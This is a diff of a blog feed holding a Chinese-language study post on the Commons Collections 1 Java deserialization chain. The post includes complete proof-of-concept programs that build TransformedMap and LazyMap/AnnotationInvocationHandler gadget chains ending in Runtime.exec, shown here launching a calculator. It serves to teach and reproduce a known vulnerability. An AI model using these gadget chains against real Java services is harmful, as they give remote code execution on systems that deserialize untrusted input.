+<h3 id="3-4-TransformedMap"><a href="#3-4-TransformedMap" class="headerlink" title="3.4 TransformedMap"></a>3.4 TransformedMap</h3><p>由于我们得到的是ChainedTransformer，一个转换链，<strong>TransformedMap</strong>类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。</p>
+<p>这样我们就可以把触发条件从显性的调用<strong>转换链的transform函数</strong>延伸到<strong>修改map的值</strong>。很明显后者是一个常规操作，极有可能被触发。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PocMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端接受反序列化，出发漏洞</span></span><br><span class="line">        <span class="comment">//读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成Map格式，再调用transform函数</span></span><br><span class="line">        Map outerMap_now =  (Map)fin.readObject();</span><br><span class="line">        <span class="comment">//2.1可以直接map添加新值，触发漏洞</span></span><br><span class="line">        <span class="comment">//outerMap_now.put(&quot;123&quot;, &quot;123&quot;);</span></span><br><span class="line">        <span class="comment">//2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="4-LazyMap版本"><a href="#4-LazyMap版本" class="headerlink" title="4. LazyMap版本"></a>4. LazyMap版本</h2><p>jdk 8u72一下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoclazyMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, IOException </span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;ddddddd&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建LazyMap的handler实例</span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span></span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler)cons.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(handler1);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 本地模拟反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>对poc进行了简单分析，分别使用了TransformedMap版和lazyMpa进行了复现</p>
+<h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6. 参考"></a>6. 参考</h2><ul>
+<li> <a href="https://shadowflow123.github.io/2021/12/15/Commons-Collections-1">https://shadowflow123.github.io/2021/12/15/Commons-Collections-1</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>java安全</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Jackson漏洞分析</title>
     <url>/Jackson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<blockquote>
@@ -209,148 +351,6 @@
       </categories>
       <tags>
         <tag>漏洞分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Commons-Collections-1</title>
-    <url>/Commons-Collections-1/</url>
-    <content><![CDATA[<blockquote>
-<p>醉后不知天在水，满船清梦压星河。</p>
-</blockquote>
-<p>Commons Collections 1反序列化链学习</p>
-<span id="more"></span>
-
-
-
-<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>在jdk1.2中的更新，主要就是java Collections框架，自从变成java处理collection的标准之后，它强大的数据结构大大提高了开发应用的效率。</p>
-<p>Commons-Collections对原有的 java Collections进行了扩展增加，有许多新的特性，包括：</p>
-<ul>
-<li><p>Bag 接口，为有多个副本的集合对象提供接口</p>
-</li>
-<li><p>BidiMap接口，为maps提供值到键，键到值的查询接口</p>
-</li>
-<li><p>MapIterator，为maps的迭代器提供简单快速的接口</p>
-</li>
-<li><p><strong>每个对象在添加到集合中时，提供改变每个对象的装饰器</strong></p>
-</li>
-<li><p>使多个集合看起来像复合集合</p>
-<p>。。。。。。</p>
-</li>
-</ul>
-<p><strong>Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</strong></p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>commons.apache.org<span class="regexp">/proper/</span>commons-collections/index.html</span><br><span class="line">http:<span class="regexp">//</span>archive.apache.org<span class="regexp">/dist/</span>commons<span class="regexp">/collections/</span>binaries/</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="2-POC复现"><a href="#2-POC复现" class="headerlink" title="2. POC复现"></a>2. POC复现</h2><ol>
-<li><p>新建一个maven工程</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>网上流传的poc</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="3-POC构造"><a href="#3-POC构造" class="headerlink" title="3. POC构造"></a>3. POC构造</h2><h3 id="3-1-直接调用"><a href="#3-1-直接调用" class="headerlink" title="3.1 直接调用"></a>3.1 直接调用</h3><p>看一下InvokerTransformer类的transform函数</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>简化一下</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>看一下对应的构造函数</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>通过构造的反射机制以及以上代码进行填空，可以得出当变量等于以下值时，可形成命令执行：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object input=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>));</span><br><span class="line"><span class="keyword">this</span>.iMethodName=<span class="string">&quot;exec&quot;</span></span><br><span class="line"><span class="keyword">this</span>.iParamTypes=String.class</span><br><span class="line"><span class="keyword">this</span>.iArgs=<span class="string">&quot;open -a calculator&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>通过函数调用POC就为：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.internal.xjc.reader.xmlschema.BindPurple;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Object input=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line"><span class="comment"> * this.iMethodName=&quot;exec&quot;</span></span><br><span class="line"><span class="comment"> * this.iParamTypes=String.class</span></span><br><span class="line"><span class="comment"> * this.iArgs=&quot;open -a calculator&quot;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span></span><br><span class="line"><span class="comment"> *         this.iMethodName = methodName;</span></span><br><span class="line"><span class="comment"> *         this.iParamTypes = paramTypes;</span></span><br><span class="line"><span class="comment"> *         this.iArgs = args;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        InvokerTransformer invokertransformer = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建invokertransformer对象后调用transform方法</span></span><br><span class="line">        <span class="comment">//Object inputobj = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        invokertransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="3-2-同一个函数中进行序列化"><a href="#3-2-同一个函数中进行序列化" class="headerlink" title="3.2 同一个函数中进行序列化"></a>3.2 同一个函数中进行序列化</h3><p>使用文件写入，代替网络传输</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc01Demo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        InvokerTransformer invokertransformer = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将invokertransformer作为文件输入流输出为payload.bin</span></span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutput objectOutput = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutput.writeObject(invokertransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从payload.bin读取invokertransformer</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建invokertransformer对象后调用transform方法</span></span><br><span class="line">        <span class="comment">//Object inputobj = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        InvokerTransformer payloadInput = (InvokerTransformer) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        payloadInput.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="3-3-网络传输时"><a href="#3-3-网络传输时" class="headerlink" title="3.3 网络传输时"></a>3.3 网络传输时</h3><p>ChainedTransformer类中，</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果。</p>
-<p>首先确定iTransformers可控，<strong>iTransformers数组</strong>是通过<strong>ChainedTransformer</strong>类的<strong>构造函数</strong>赋值的。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们可以通过创建一个ChainedTransformer对象来控制iTransformers数组</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
-
-
-
-<p>那我们就把payload封装成Transformer[]。然后作为构造函数的参数创建一个ChainedTransformer对象</p>
-<p>首先Transformer是一个接口</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>那么我们封装payload的时候就要转换成Transformer的实现类。</p>
-<p>InvokerTransformer 继承了Transformer 和 Serializable</p>
-<p>ConstantTransformer也继承了Transformer</p>
-<p>这里用InvokerTransformer来改造poc</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//客户端poc</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//服务端poc</span></span><br><span 